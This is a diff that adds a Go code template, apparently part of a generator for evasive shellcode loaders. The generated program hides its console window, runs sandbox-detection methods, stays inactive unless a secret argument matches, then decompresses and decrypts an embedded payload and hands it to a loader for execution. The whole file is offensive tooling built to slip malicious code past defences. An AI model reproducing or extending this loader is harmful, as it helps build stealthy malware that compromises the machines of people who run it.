@@ -1,0 +1,54 @@
+package main
+
+import (
+    {{if .Compressor}}
+        "{{.Compressor.Import}}"
+    {{end}}
+	"variant/crypto"
+	"variant/loader"
+	{{if .SandBox}}
+	    "{{.SandBox.Import}}"
+	{{end}}
+)
+
+func init() {
+	loader.HideConsoleWin()
+	{{range .SandBox.Methods}}
+	    {{- .}}
+	{{end}}
+}
+
+func main() {
+	args := os.Args
+	if len(args) < 2 {
+		os.Exit(0)
+	}
+
+    {{.ArgsName}} := "{{.ArgsValue}}"
+   	if {{.ArgsName}} == args[1] {
+        {{if .KeyName}}
+        	{{- .KeyName}} := []byte("{{.KeyValue}}")
+        	{{end}}
+
+        	{{if .Compressor}}
+        	    {{- .KeyName}}, _ = {{.Compressor.Algorithm}}({{.KeyName}}, {{.Compressor.Ratio}})
+            {{end}}
+
+        	{{if .IvName}}
+        	    {{- .IvName}}  := []byte("{{.IvValue}}")
+        	    {{if .Compressor}}
+        	    {{- .IvName}}, _ = {{.Compressor.Algorithm}}({{.IvName}}, {{.Compressor.Ratio}})
+        	    {{end}}
+        	{{end}}
+
+        	{{if .Compressor}}
+            	    {{.CipherText}}, _ = {{.Compressor.Algorithm}}("{{.Payload}}", {{.Compressor.Ratio}})
+            {{else}}
+                    {{.CipherText}} := "{{.Payload}}"
+            {{end}}
+
+        	{{.PlainText}}, _ := crypto.{{.Decrypt}}({{.CipherText}}, {{.KeyName}}{{if .IvName}}, {{.IvName}}{{end}})
+
+        	loader.{{.Loader}}({{.PlainText}})
+    }
+}
